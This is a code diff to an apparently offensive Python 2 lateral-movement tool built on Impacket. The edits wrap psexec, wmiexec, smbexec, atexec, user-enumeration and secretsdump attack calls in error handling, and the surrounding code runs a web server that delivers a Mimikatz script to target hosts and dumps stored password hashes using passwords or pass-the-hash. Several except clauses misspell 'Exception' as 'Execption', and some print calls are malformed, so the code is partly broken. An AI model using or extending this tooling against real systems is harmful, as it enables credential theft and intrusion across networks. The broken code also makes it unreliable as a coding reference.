@@ -390,7 +390,8 @@ Create Pasteable Double Encoded Script:
     format = logging.Formatter("%(asctime)s [%(levelname)-5.5s]  %(message)s") # Log format
     logger_obj = logging.getLogger()                                                                  # Getter for logging agent
     file_handler = logging.FileHandler(args.log)                                                      # File Handler
-    #stderr_handler = logging.StreamHandler()                                                          # STDERR Handler
+    #stderr_handler = logging.StreamHandler(sys.stderr)                                                          # STDERR Handler
+    #stdout_handler = logging.StreamHandler(sys.stdout)
     src_ip = args.src_ip               # IP to source the Mimikatz script on
     payload = args.payload             # The name of the payload that will be used
     interface = args.interface         # The interface to grab the IP from
@@ -446,10 +447,12 @@ Create Pasteable Double Encoded Script:
     # Configure logger formats for STDERR and output file
     file_handler.setFormatter(format)
     #stderr_handler.setFormatter(format)
+    #stdout_handler.setFormatter(format)
 
     # Configure logger object
     logger_obj.addHandler(file_handler)
     #logger_obj.addHandler(stderr_handler)
+    #logger_obj.addHandler(stdout_handler)
     logger_obj.setLevel(level)
 
     # Get details for catapult server
@@ -615,8 +618,11 @@ Create Pasteable Double Encoded Script:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
-            attack.run(dst)
+            try:
+                attack=psexec.PSEXEC(command, path=directory, protocols=protocol, username = usr, password = pwd, domain = dom, hashes = hash, copyFile = None, exeFile = None, aesKey = aes, doKerberos = kerberos)
+                attack.run(dst)
+            except Execption, e:
+                print("[!] An error occured during execution: %s") % (e)
             if attacks:
                 srv.terminate()
                 print("[*] Shutting down the catapult web server")
@@ -633,17 +639,29 @@ Create Pasteable Double Encoded Script:
                     sys.exit("[!] You must provide a command or attack for exploitation if you are using wmiexec")
             if attacks and not encoder:
                 print(test)
-                test = wmi_test(usr, pwd, dom, dst)
+                if hash:
+                    test = True
+                else:
+                    test = wmi_test(usr, pwd, dom, dst)
                 if test:
-                    attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    attack.run(dst)
+                    try:
+                        attack=wmiexec.WMIEXEC(unprotected_command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                        attack.run(dst)
+                    except (Exception, KeyboardInterrupt), e:
+                        print("[!] An error occured during execution: %s") % (e)
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             else:
-                test = wmi_test(usr, pwd, dom, dst)
+                if hash:
+                    test = True
+                else:
+                    test = wmi_test(usr, pwd, dom, dst, hash)
                 if test:
-                    attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
-                    attack.run(dst)
+                    try:
+                        attack=wmiexec.WMIEXEC(command, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, share = share, noOutput = no_output, doKerberos=kerberos)
+                        attack.run(dst)
+                    except (Exception, KeyboardInterrupt), e:
+                        print("[!] An error occured during execution: %s") % (e)
                 else:
                     print("[-] Could not gain access to %s using the domain %s user %s and password %s") % (dst, dom, usr, pwd)
             if attacks:
@@ -657,9 +675,15 @@ Create Pasteable Double Encoded Script:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
-            attack = netview.USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
-            attack.run()
+            try:
+                opted = NetviewDetails(user = None, users = None, target = dst, targets = None, noloop = True, delay = '10', max_connections = '1000', domainController = None, debug = False)
+            except Execption, e:
+                print("[!] An error occured during execution: %s") % (e)
+            try:
+                attack = netview.USERENUM(username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, options=opted)
+                attack.run()
+            except Execption, e:
+                print("[!] An error occured during execution: %s") % (e)
     elif smbexec_cmd:
         for dst in final_targets:
             if attacks:
@@ -669,8 +693,11 @@ Create Pasteable Double Encoded Script:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
-            attack.run(dst)
+            try:
+                attack=smbexec.CMDEXEC(protocols = protocol, username = usr, password = pwd, domain = dom, hashes = hash,  aesKey = aes, doKerberos = kerberos, mode = mode, share = share)
+                attack.run(dst)
+            except Execption, e:
+                print("[!] An error occured during execution: %s") % (e)
             if attacks:
                 srv.terminate()
                 print("[*] Shutting down the catapult web server")
@@ -685,8 +712,11 @@ Create Pasteable Double Encoded Script:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
             if command == "cmd.exe":
                 sys.exit("[!] Please provide a viable command for execution")
-            attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
-            attack.play(dst)
+            try:
+                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = command)
+                attack.play(dst)
+            except Execption, e:
+                print("[!] An error occured during execution: %s") % (e)
             if attacks and not encoder:
                 srv = http_server(src_port, cwd)
                 print("[*] Starting web server on port %s in %s") % (str(src_port), str(cwd))
@@ -696,8 +726,11 @@ Create Pasteable Double Encoded Script:
                     print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
                 if command == "cmd.exe":
                     sys.exit("[!] Please provide a viable command for execution")
-                attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command)
-                attack.play(dst)
+                try:
+                    attack=atexec.ATSVC_EXEC(username = usr, password = pwd, domain = dom, command = unprotected_command)
+                    attack.play(dst)
+                except Exception, e:
+                    print("[!] An error occured during execution: %s") % (e)
             if attacks:
                 srv.terminate()
                 print("[*] Shutting down the catapult web server")
@@ -707,11 +740,11 @@ Create Pasteable Double Encoded Script:
                 print("[*] Attempting to access the system %s with, user: %s hash: %s domain: %s ") % (dst, usr, hash, dom)
             else:
                 print("[*] Attempting to access the system %s with, user: %s pwd: %s domain: %s ") % (dst, usr, pwd, dom)
-            attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
             try:
+                attack=secretsdump.DumpSecrets(address = dst, username = usr, password = pwd, domain = dom, hashes = hash, aesKey = aes, doKerberos = kerberos, system = system, security = security, sam = sam, ntds = ntds)
                 attack.dump()
             except Execption, e:
-                print("[!] An error occured during execution")
+                print("[!] An error occured during execution: %s") % (e)
     else:
         print(instructions)
         print(x.return_command())
